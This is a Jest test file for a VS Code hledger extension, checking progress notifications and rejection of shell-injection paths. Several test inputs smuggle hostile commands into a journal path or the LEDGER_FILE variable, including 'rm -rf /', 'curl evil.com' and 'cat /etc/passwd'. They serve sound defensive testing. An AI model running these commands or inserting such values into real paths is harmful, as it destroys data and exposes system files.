// HLedgerCliCommands.test.ts - Tests for CLI command handlers

import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { HLedgerCliCommands } from '../HLedgerCliCommands';
import { HLedgerCliService } from '../services/HLedgerCliService';

describe('HLedgerCliCommands - Progress Indicators', () => {
    let tempDir: string;
    let validJournalPath: string;
    let mockService: HLedgerCliService;
    let commands: HLedgerCliCommands;
    let mockEditor: any;
    let mockDocument: any;
    let mockProgress: any;

    beforeEach(() => {
        tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'hledger-test-'));
        validJournalPath = path.join(tempDir, 'test.journal');
        fs.writeFileSync(validJournalPath, '2025-01-01 Test\n  Assets:Bank  $100\n');

        mockService = new HLedgerCliService();
        commands = new HLedgerCliCommands(mockService);

        mockDocument = {
            uri: { fsPath: validJournalPath },
            languageId: 'hledger'
        };

        mockEditor = {
            document: mockDocument,
            selection: { active: { line: 0, character: 0 } },
            edit: jest.fn().mockResolvedValue(true)
        };

        mockProgress = {
            report: jest.fn()
        };

        const vscode = require('vscode');
        vscode.window.activeTextEditor = mockEditor;
        vscode.window.showInformationMessage = jest.fn();
        vscode.window.showErrorMessage = jest.fn();
    });

    afterEach(() => {
        commands.dispose();
        mockService.dispose();
        fs.rmSync(tempDir, { recursive: true, force: true });
        delete process.env.LEDGER_FILE;
    });

    it('should show progress notification during balance command execution', async () => {
        const vscode = require('vscode');
        const withProgressSpy = jest.spyOn(vscode.window, 'withProgress');

        jest.spyOn(mockService, 'isHledgerAvailable').mockResolvedValue(true);
        jest.spyOn(mockService, 'runBalance').mockResolvedValue('Balance Report');
        jest.spyOn(mockService, 'formatAsComment').mockReturnValue('; Balance Report');

        await commands.insertBalance();

        expect(withProgressSpy).toHaveBeenCalledWith(
            expect.objectContaining({
                location: vscode.ProgressLocation.Notification,
                title: 'Running hledger balance...',
                cancellable: false
            }),
            expect.any(Function)
        );
    });

    it('should show progress notification during stats command execution', async () => {
        const vscode = require('vscode');
        const withProgressSpy = jest.spyOn(vscode.window, 'withProgress');

        jest.spyOn(mockService, 'isHledgerAvailable').mockResolvedValue(true);
        jest.spyOn(mockService, 'runStats').mockResolvedValue('Stats Report');
        jest.spyOn(mockService, 'formatAsComment').mockReturnValue('; Stats Report');

        await commands.insertStats();

        expect(withProgressSpy).toHaveBeenCalledWith(
            expect.objectContaining({
                location: vscode.ProgressLocation.Notification,
                title: 'Running hledger stats...',
                cancellable: false
            }),
            expect.any(Function)
        );
    });

    it('should show progress notification during incomestatement command execution', async () => {
        const vscode = require('vscode');
        const withProgressSpy = jest.spyOn(vscode.window, 'withProgress');

        jest.spyOn(mockService, 'isHledgerAvailable').mockResolvedValue(true);
        jest.spyOn(mockService, 'runIncomestatement').mockResolvedValue('Income Statement Report');
        jest.spyOn(mockService, 'formatAsComment').mockReturnValue('; Income Statement Report');

        await commands.insertIncomestatement();

        expect(withProgressSpy).toHaveBeenCalledWith(
            expect.objectContaining({
                location: vscode.ProgressLocation.Notification,
                title: 'Running hledger incomestatement...',
                cancellable: false
            }),
            expect.any(Function)
        );
    });

    it('should still show error messages when CLI fails inside progress', async () => {
        const vscode = require('vscode');

        jest.spyOn(mockService, 'isHledgerAvailable').mockResolvedValue(true);
        jest.spyOn(mockService, 'runBalance').mockRejectedValue(new Error('CLI execution failed'));

        await commands.insertBalance();

        expect(vscode.window.showErrorMessage).toHaveBeenCalledWith(
            expect.stringContaining('Failed to run hledger balance')
        );
    });
});

describe('HLedgerCliCommands - Command Injection Prevention', () => {
    let tempDir: string;
    let validJournalPath: string;

    beforeEach(() => {
        tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'hledger-test-'));
        validJournalPath = path.join(tempDir, 'test.journal');
        fs.writeFileSync(validJournalPath, '2025-01-01 Test\n  Assets:Bank  $100\n');
    });

    afterEach(() => {
        fs.rmSync(tempDir, { recursive: true, force: true });
        delete process.env.LEDGER_FILE;
    });

    describe('sanitizeJournalPath', () => {
        let commands: HLedgerCliCommands;
        let mockService: HLedgerCliService;

        beforeEach(() => {
            mockService = new HLedgerCliService();
            commands = new HLedgerCliCommands(mockService);
        });

        afterEach(() => {
            commands.dispose();
            mockService.dispose();
        });

        it('should reject paths with semicolon', () => {
            const maliciousPath = `${validJournalPath}; rm -rf /`;

            expect(() => {
                (commands as any).sanitizeJournalPath(maliciousPath);
            }).toThrow(/shell metacharacters/);
        });

        it('should reject paths with ampersand', () => {
            const maliciousPath = `${validJournalPath} && curl evil.com`;

            expect(() => {
                (commands as any).sanitizeJournalPath(maliciousPath);
            }).toThrow(/shell metacharacters/);
        });

        it('should reject paths with pipe', () => {
            const maliciousPath = `${validJournalPath} | cat /etc/passwd`;

            expect(() => {
                (commands as any).sanitizeJournalPath(maliciousPath);
            }).toThrow(/shell metacharacters/);
        });

        it('should reject paths with backticks', () => {
            const maliciousPath = `${validJournalPath}\`whoami\``;

            expect(() => {
                (commands as any).sanitizeJournalPath(maliciousPath);
            }).toThrow(/shell metacharacters/);
        });

        it('should reject paths with dollar command substitution', () => {
            const maliciousPath = `${validJournalPath}$(whoami)`;

            expect(() => {
                (commands as any).sanitizeJournalPath(maliciousPath);
            }).toThrow(/shell metacharacters/);
        });

        it('should reject paths with parentheses', () => {
            const maliciousPath = `${validJournalPath}()`;

            expect(() => {
                (commands as any).sanitizeJournalPath(maliciousPath);
            }).toThrow(/shell metacharacters/);
        });

        it('should reject paths with square brackets', () => {
            const maliciousPath = `${validJournalPath}[test]`;

            expect(() => {
                (commands as any).sanitizeJournalPath(maliciousPath);
            }).toThrow(/shell metacharacters/);
        });

        it('should reject paths with curly braces', () => {
            const maliciousPath = `${validJournalPath}{test}`;

            expect(() => {
                (commands as any).sanitizeJournalPath(maliciousPath);
            }).toThrow(/shell metacharacters/);
        });

        it('should reject paths with caret', () => {
            const maliciousPath = `${validJournalPath}^test`;

            expect(() => {
                (commands as any).sanitizeJournalPath(maliciousPath);
            }).toThrow(/shell metacharacters/);
        });

        it('should reject paths with double quotes', () => {
            const maliciousPath = `${validJournalPath}"test"`;

            expect(() => {
                (commands as any).sanitizeJournalPath(maliciousPath);
            }).toThrow(/shell metacharacters/);
        });

        it('should reject paths with backslash', () => {
            const maliciousPath = `${validJournalPath}\\test`;

            expect(() => {
                (commands as any).sanitizeJournalPath(maliciousPath);
            }).toThrow(/shell metacharacters/);
        });

        it('should reject paths with less-than', () => {
            const maliciousPath = `${validJournalPath}<test`;

            expect(() => {
                (commands as any).sanitizeJournalPath(maliciousPath);
            }).toThrow(/shell metacharacters/);
        });

        it('should reject paths with greater-than', () => {
            const maliciousPath = `${validJournalPath}>test`;

            expect(() => {
                (commands as any).sanitizeJournalPath(maliciousPath);
            }).toThrow(/shell metacharacters/);
        });

        it('should reject non-existent paths', () => {
            const nonExistentPath = path.join(tempDir, 'nonexistent.journal');

            expect(() => {
                (commands as any).sanitizeJournalPath(nonExistentPath);
            }).toThrow(/does not exist or is not accessible/);
        });

        it('should reject unreadable paths', () => {
            const unreadablePath = path.join(tempDir, 'unreadable.journal');
            fs.writeFileSync(unreadablePath, 'test');
            fs.chmodSync(unreadablePath, 0o000);

            try {
                expect(() => {
                    (commands as any).sanitizeJournalPath(unreadablePath);
                }).toThrow(/does not exist or is not accessible/);
            } finally {
                fs.chmodSync(unreadablePath, 0o644);
            }
        });

        it('should accept valid paths', () => {
            const result = (commands as any).sanitizeJournalPath(validJournalPath);
            expect(result).toBe(validJournalPath);
        });

        it('should accept paths with spaces', () => {
            const pathWithSpaces = path.join(tempDir, 'test file.journal');
            fs.writeFileSync(pathWithSpaces, 'test');

            const result = (commands as any).sanitizeJournalPath(pathWithSpaces);
            expect(result).toBe(pathWithSpaces);
        });

        it('should accept paths with hyphens', () => {
            const pathWithHyphens = path.join(tempDir, 'test-file.journal');
            fs.writeFileSync(pathWithHyphens, 'test');

            const result = (commands as any).sanitizeJournalPath(pathWithHyphens);
            expect(result).toBe(pathWithHyphens);
        });
    });

    describe('getJournalFilePath with sanitization', () => {
        let commands: HLedgerCliCommands;
        let mockService: HLedgerCliService;
        let mockDocument: any;

        beforeEach(() => {
            mockService = new HLedgerCliService();
            commands = new HLedgerCliCommands(mockService);
            mockDocument = {
                uri: { fsPath: validJournalPath },
                languageId: 'hledger'
            };
        });

        afterEach(() => {
            commands.dispose();
            mockService.dispose();
        });

        it('should sanitize environment variable path', () => {
            process.env.LEDGER_FILE = `${validJournalPath}; rm -rf /`;

            expect(() => {
                (commands as any).getJournalFilePath(mockDocument);
            }).toThrow(/shell metacharacters/);
        });

        it('should use valid environment variable path', () => {
            process.env.LEDGER_FILE = validJournalPath;

            const result = (commands as any).getJournalFilePath(mockDocument);
            expect(result).toBe(validJournalPath);
        });

        it('should use document path if environment variable is invalid', () => {
            process.env.LEDGER_FILE = `${validJournalPath}; rm -rf /`;

            expect(() => {
                (commands as any).getJournalFilePath(mockDocument);
            }).toThrow(/shell metacharacters/);
        });

        it('should bypass sanitization for trusted document path', () => {
            delete process.env.LEDGER_FILE;

            const result = (commands as any).getJournalFilePath(mockDocument);
            expect(result).toBe(validJournalPath);
        });
    });
});
